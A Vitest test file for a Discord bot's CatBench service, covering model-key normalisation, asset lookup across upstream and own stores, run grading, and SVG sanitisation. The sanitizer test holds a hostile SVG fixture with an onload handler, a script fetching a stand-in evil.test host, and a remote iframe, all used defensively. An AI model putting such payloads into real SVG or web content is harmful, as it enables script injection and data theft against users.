import { describe, it, expect, vi, beforeEach, afterEach } from 'vitest';

// catbench.js pulls in config.js, which hard-exits on missing required env vars.
process.env.BOT_TOKEN ??= 'test';
process.env.CLIENT_ID ??= 'test';
process.env.GUILD_ID ??= 'test';
process.env.HF_TOKEN ??= 'test';
process.env.CATBENCH_DATASET ??= 'Honkware/catbench-results';

const { normKey, modelKey, lookup, listAll, gradeRun } = await import(
  '../src/services/catbench.js'
);
const { sanitizeSvg } = await import('../src/utils/svg.js');

// One model, shaped exactly like upstream's demos/CatBench/manifest.json.
const MANIFEST = {
  models: {
    'glm-5.2': {
      display_name: 'glm-5.2',
      python_render: 'assets/glm-5.2-python.jpg',
      svg: 'assets/glm-5.2-svg.jpg',
      python_source: 'assets/glm-5.2.py',
      svg_source: 'assets/glm-5.2.svg',
    },
    'north-mini-code-1.0_30b': {
      display_name: 'North-Mini-Code-1.0_30B',
      python_render: 'assets/North-Mini-Code-1.0_30B-python.jpg',
      svg: 'assets/North-Mini-Code-1.0_30B-svg.jpg',
    },
    'muse-spark-1.1': {
      display_name: 'muse-spark-1.1',
      svg: 'assets/muse-spark-1.1-svg.jpg',
      python_render: 'assets/muse-spark-1.1-python.jpg',
    },
  },
};

// Our own store: upstream's shape plus what upstream does not record. Same
// muse-spark entry, so precedence between the two stores is testable.
const OURS = {
  models: {
    'qwen3-8b': {
      display_name: 'Qwen3-8B',
      model_id: 'Qwen/Qwen3-8B',
      svg: 'assets/qwen3-8b-svg.jpg',
      python_render: 'assets/qwen3-8b-python.jpg',
      svg_source: 'assets/qwen3-8b.svg',
      python_source: 'assets/qwen3-8b.py',
      loader: 'exl3',
      engine: '0.0.43',
      run_date: '2026-08-09T21:00:00Z',
    },
    'muse-spark-1.1': {
      display_name: 'muse-spark-1.1',
      model_id: 'someone/Muse-Spark-1.1',
      svg: 'assets/muse-spark-1.1-svg.jpg',
      python_render: 'assets/muse-spark-1.1-python.jpg',
      run_date: '2026-08-09T21:00:00Z',
    },
  },
};
const OURS_BASE = 'https://huggingface.co/datasets/Honkware/catbench-results/resolve/main';

describe('catbench keys', () => {
  it('normalizes a stem the way the upstream page does', () => {
    expect(normKey('North-Mini-Code-1.0_30B')).toBe('north-mini-code-1.0-30b');
    expect(normKey('Muse Spark 1.1')).toBe('muse-spark-1.1');
  });

  it('keys a HuggingFace id by the half after the slash', () => {
    expect(modelKey('zai-org/GLM-5.2')).toBe('glm-5.2');
    expect(modelKey('glm-5.2')).toBe('glm-5.2');
  });
});

describe('catbench gallery', () => {
  beforeEach(() => {
    vi.stubGlobal(
      'fetch',
      vi.fn(async (url) => {
        if (String(url).startsWith(OURS_BASE)) return { ok: true, json: async () => OURS };
        if (String(url).endsWith('manifest.json')) {
          return { ok: true, json: async () => MANIFEST };
        }
        throw new Error(`unexpected fetch: ${url}`);
      })
    );
  });
  afterEach(() => {
    vi.unstubAllGlobals();
    vi.useRealTimers();
  });

  it('resolves a HuggingFace id to the published assets', async () => {
    const hit = await lookup('zai-org/GLM-5.2');
    expect(hit.source).toBe('upstream');
    expect(hit.svg).toBe('https://katehuuh.github.io/demos/CatBench/assets/glm-5.2-svg.jpg');
    expect(hit.python).toBe('https://katehuuh.github.io/demos/CatBench/assets/glm-5.2-python.jpg');
  });

  it('resolves an underscored display name through the same key rule', async () => {
    const hit = await lookup('someorg/North-Mini-Code-1.0_30B');
    expect(hit.name).toBe('North-Mini-Code-1.0_30B');
  });

  it('returns null for a model nobody has benched', async () => {
    expect(await lookup('meta-llama/Llama-3.1-8B-Instruct')).toBeNull();
  });

  it('lists everything benched', async () => {
    const all = await listAll();
    expect(all.map((e) => e.key)).toContain('glm-5.2');
    expect(all.map((e) => e.key)).toContain('qwen3-8b');
  });
});

describe('our own store', () => {
  beforeEach(() => {
    vi.stubGlobal(
      'fetch',
      vi.fn(async (url) => {
        if (String(url).startsWith(OURS_BASE)) return { ok: true, json: async () => OURS };
        if (String(url).endsWith('manifest.json')) return { ok: true, json: async () => MANIFEST };
        throw new Error(`unexpected fetch: ${url}`);
      })
    );
  });
  afterEach(() => vi.unstubAllGlobals());

  it('serves a run we did, with the loader and engine that did it', async () => {
    const hit = await lookup('Qwen/Qwen3-8B');
    expect(hit.source).toBe('ours');
    expect(hit.svg).toBe(`${OURS_BASE}/assets/qwen3-8b-svg.jpg`);
    expect(hit.loader).toBe('exl3');
    expect(hit.engine).toBe('0.0.43');
    expect(hit.at).toBe('2026-08-09T21:00:00Z');
  });

  it('wins over upstream, so a forced re-run is not invisible', async () => {
    expect((await lookup('someone/Muse-Spark-1.1')).source).toBe('ours');
  });

  it('does not answer for another org that happens to share a stem', async () => {
    // someoneelse/Qwen3-8B is a different repo. Upstream's key rule cannot see
    // that; we recorded the model id, so we can.
    expect(await lookup('someoneelse/Qwen3-8B')).toBeNull();
    expect((await lookup('qwen3-8b')).source).toBe('ours');
  });
});

describe('gradeRun', () => {
  const png = Buffer.alloc(4096, 7);
  const good = { svg: "<svg><circle r='3'/></svg>", python_source: 'import matplotlib' };

  it('accepts a run where both halves drew something', () => {
    expect(gradeRun(good, { svgPng: png, pythonPng: png }).ok).toBe(true);
  });

  it('refuses a script that crashed after drawing', () => {
    const g = gradeRun({ ...good, python_error: 'ZeroDivisionError' }, { svgPng: png, pythonPng: png });
    expect(g.ok).toBe(false);
    expect(g.why).toContain('crashed');
  });

  it('refuses prose where the code should be', () => {
    expect(gradeRun({ svg: good.svg, python_error: 'no python in the reply' }, { svgPng: png }).ok).toBe(
      false
    );
  });

  it('refuses an SVG with no marks in it', () => {
    expect(gradeRun({ ...good, svg: '<svg><defs/></svg>' }, { svgPng: png, pythonPng: png }).ok).toBe(
      false
    );
  });

  it('refuses an SVG that rasterized blank', () => {
    expect(gradeRun(good, { svgPng: Buffer.alloc(200), pythonPng: png }).ok).toBe(false);
  });
});

describe('sanitizeSvg', () => {
  it('drops scripts, handlers and remote references', () => {
    const dirty =
      '<svg xmlns="http://www.w3.org/2000/svg" onload="steal()">' +
      '<script>fetch("https://evil.test")</script>' +
      '<image href="https://evil.test/pixel.png"/>' +
      '<foreignObject><iframe src="https://evil.test"></iframe></foreignObject>' +
      '<use xlink:href="#paw"/><circle r="3" fill="orange"/></svg>';
    const clean = sanitizeSvg(dirty);

    expect(clean).not.toContain('<script');
    expect(clean).not.toContain('onload');
    expect(clean).not.toContain('evil.test');
    expect(clean).not.toContain('foreignObject');
    // In-document refs and the drawing itself survive.
    expect(clean).toContain('xlink:href="#paw"');
    expect(clean).toContain('<circle r="3" fill="orange"/>');
  });

  it('keeps an inline data image', () => {
    const svg = '<svg><image href="data:image/png;base64,AAAA"/></svg>';
    expect(sanitizeSvg(svg)).toContain('data:image/png;base64,AAAA');
  });
});
